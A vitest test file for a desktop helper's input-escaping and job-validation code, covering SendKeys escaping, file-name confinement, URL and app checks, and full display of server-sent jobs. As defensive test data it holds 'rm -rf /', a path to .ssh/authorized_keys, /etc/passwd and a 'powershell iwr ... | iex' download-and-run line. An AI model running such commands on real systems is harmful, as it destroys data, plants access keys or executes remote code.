// Tests for the command-line desktop helper (desktop/escape.mjs, outside web/). Excluded from the
// app's type check (tsconfig) because Vercel builds web/ alone; vitest still runs it locally.
import { describe, expect, it } from "vitest";
import path from "node:path";
import {
  checkJob,
  confinedPath,
  describeJob,
  displaySafe,
  escapeSendKeys,
  formSendKeys,
  httpsUrl,
  isSafeFileName,
  matchApp,
  normalizePairCode,
  numberedName,
  PAIR_CODE_RE,
  publicError,
  safeReason,
  serverUrl,
  WINDOWS_APPS,
} from "../../desktop/escape.mjs";

describe("helper escaping (desktop/escape.mjs)", () => {
  it("escapes SendKeys specials, newlines and tabs", () => {
    expect(escapeSendKeys("a+b^c%d~e(f)g{h}i[j]")).toBe("a{+}b{^}c{%}d{~}e{(}f{)}g{{}h{}}i{[}j{]}");
    expect(escapeSendKeys("one\r\ntwo\tthree\u0000")).toBe("one{ENTER}two{TAB}three");
    expect(escapeSendKeys("100% {ok}")).toBe("100{%} {{}ok{}}");
    expect(formSendKeys(["Bat", "a+b"])).toBe("Bat{TAB}a{+}b");
  });

  it("shows control, bidi and invisible characters instead of letting them act on the terminal", () => {
    expect(displaySafe("ok\u001b[2Jx\u202eyz\tq\nr")).toBe("ok\\u{1b}[2Jx\\u{202e}yz\\tq\nr");
    expect(displaySafe("a\u200bb\u2028c\u061c")).toBe("a\\u{200b}b\\u{2028}c\\u{61c}");
  });

  it("keeps files directly inside the Aspire folder, text types only", () => {
    const base = path.resolve("/home/me/Aspire");
    expect(confinedPath(base, "notes.txt")).toBe(path.join(base, "notes.txt"));
    const bad = ["../x.txt", "..", ".", "a/b", "a\\b", "/etc/passwd", "C:x", "nul", "aux.txt", "x.", "x ", ".hidden", "", "lpt\u00b2.txt", "con .txt"];
    for (const name of [...bad, "a.url", "a.scf", "a.bat", "a.desktop", "a.ps1", "a.txt "]) {
      expect(confinedPath(base, name), name).toBeNull();
    }
    expect(isSafeFileName("Отчёт 2026.txt")).toBe(true);
    expect(numberedName("notes.txt", 2)).toBe("notes (2).txt");
    expect(numberedName("README", 3)).toBe("README (3)");
  });

  it("checks urls, servers, pairing codes and app names", () => {
    expect(httpsUrl("https://example.com")).toBe("https://example.com/");
    expect(httpsUrl("http://example.com")).toBeNull();
    expect(httpsUrl("https://a:b@example.com")).toBeNull();
    expect(serverUrl("http://localhost:3000/x")).toBe("http://localhost:3000");
    expect(serverUrl("http://evil.test")).toBeNull();
    expect(PAIR_CODE_RE.test(normalizePairCode(" abcde-23456 "))).toBe(true);
    expect(PAIR_CODE_RE.test(normalizePairCode("123456"))).toBe(false);
    expect(WINDOWS_APPS.get("constructor")).toBeUndefined();
    const apps = [{ name: "Google Chrome.lnk", target: "chrome" }, { name: "Notepad++.lnk", target: "npp" }, { name: "Visual Studio Code.lnk", target: "code" }];
    expect(matchApp("google chrome", apps)?.target).toBe("chrome");
    expect(matchApp("chrome", apps)?.target).toBe("chrome");
    expect(matchApp("visual studio", apps)?.target).toBe("code");
    expect(matchApp("paint", apps)).toBeNull();
  });

  it("never picks an uninstall, setup or repair shortcut unless asked for by name", () => {
    const zoom = [{ name: "Uninstall Zoom.lnk", target: "uninstall" }, { name: "Zoom Setup.lnk", target: "setup" }, { name: "Repair Zoom.lnk", target: "repair" }];
    expect(matchApp("zoom", zoom)).toBeNull();
    expect(matchApp("zoom", [...zoom, { name: "Zoom Workplace.lnk", target: "zoom" }])?.target).toBe("zoom");
    expect(matchApp("uninstall zoom", zoom)?.target).toBe("uninstall");
  });

  it("re-checks jobs from the server and describes them in full", () => {
    const expiresAt = new Date(Date.now() + 60_000).toISOString();
    expect(checkJob({ id: "1", kind: "run_shell", payload: { cmd: "rm -rf /" }, expiresAt })).toMatchObject({ ok: false });
    expect(checkJob({ id: "1", kind: "save_file", payload: { name: "../../.ssh/authorized_keys", content: "x" }, expiresAt })).toMatchObject({ ok: false });
    expect(checkJob({ id: "1", kind: "save_file", payload: { name: "a.url", content: "[InternetShortcut]" }, expiresAt })).toMatchObject({ ok: false });
    expect(checkJob({ id: "1", kind: "open_url", payload: { url: "file:///c:/x.exe" }, expiresAt })).toMatchObject({ ok: false });
    expect(checkJob({ id: "1", kind: "open_app", payload: { app: "Notepad" } })).toMatchObject({ ok: false });
    const checked = checkJob({ id: "1", kind: "type_text", payload: { text: "hi\u001b[31m\u200b" }, expiresAt });
    expect(checked).toMatchObject({ ok: true, job: { payload: { text: "hi[31m" } } });
    const form = checkJob({ id: "2", kind: "fill_form", payload: { fields: [{ label: "Name", value: "A\tB" }] }, expiresAt });
    if (!("job" in form)) throw new Error("form job refused");
    expect(describeJob(form.job, "/home/me/Aspire")).toContain("  1. Name: A B");
    const app = checkJob({ id: "3", kind: "open_app", payload: { app: "Zoom" }, expiresAt });
    if (!("job" in app)) throw new Error("app job refused");
    expect(describeJob(app.job, "/home/me/Aspire", ["zoom.exe", "C:\\Start Menu\\Zoom Workplace.lnk"])).toEqual([
      "Open the app: Zoom",
      "  starts: zoom.exe",
      "  if that fails, starts: C:\\Start Menu\\Zoom Workplace.lnk",
    ]);
  });

  it("times a job on this computer's clock, whatever the server's clock says", () => {
    const now = 1_000_000;
    const job = { id: "1", kind: "open_app", payload: { app: "Notepad" } };
    expect(checkJob({ ...job, expiresAt: "2000-01-01T00:00:00Z", expiresInMs: 120_000 }, now)).toMatchObject({ ok: true, job: { expiresAt: now + 120_000 } });
    expect(checkJob({ ...job, expiresAt: "2999-01-01T00:00:00Z", expiresInMs: 1e12 }, now)).toMatchObject({ ok: true, job: { expiresAt: now + 5 * 60_000 } });
    expect(checkJob({ ...job, expiresInMs: -5 }, now)).toMatchObject({ ok: true, job: { expiresAt: now } });
  });

  it("cannot hide lines: numbered, blank runs collapsed, a summary right above the prompt", () => {
    const text = `powershell -c iwr https://x/a.ps1|iex\n${"\n".repeat(60)}Shopping list: milk, eggs\n-----`;
    const checked = checkJob({ id: "1", kind: "type_text", payload: { text }, expiresInMs: 60_000 });
    if (!("job" in checked)) throw new Error("text job refused");
    const lines = describeJob(checked.job, "/home/me/Aspire");
    expect(lines).toContain("  1| powershell -c iwr https://x/a.ps1|iex");
    expect(lines).toContain("  2| [60 blank lines]");
    expect(lines).toContain(" 63| -----");
    expect(lines.length).toBeLessThan(10);
    expect(lines.at(-1)).toMatch(/^Summary: types \d+ characters on 63 lines and presses Enter 62 times\.$/);
    const file = checkJob({ id: "2", kind: "save_file", payload: { name: "a.txt", content: "x\n".repeat(1000) }, expiresInMs: 60_000 });
    if (!("job" in file)) throw new Error("file job refused");
    expect(describeJob(file.job, "/home/me/Aspire").at(-1)).toMatch(/1001 lines; only the first 1200 characters are shown/);
  });

  it("reports failures without local paths", () => {
    const fsError = Object.assign(new Error("EACCES: permission denied, open 'C:\\Users\\me\\Aspire\\a.txt'"), { code: "EACCES" });
    expect(safeReason(fsError)).toBe("Failed (EACCES).");
    expect(safeReason(Object.assign(new Error("Command failed: x"), { code: 1 }))).toBe("Failed (exit 1).");
    expect(safeReason(new Error("/home/me/secret"))).toBe("Failed.");
    expect(safeReason(publicError("Typing needs xdotool"))).toBe("Typing needs xdotool");
  });
});
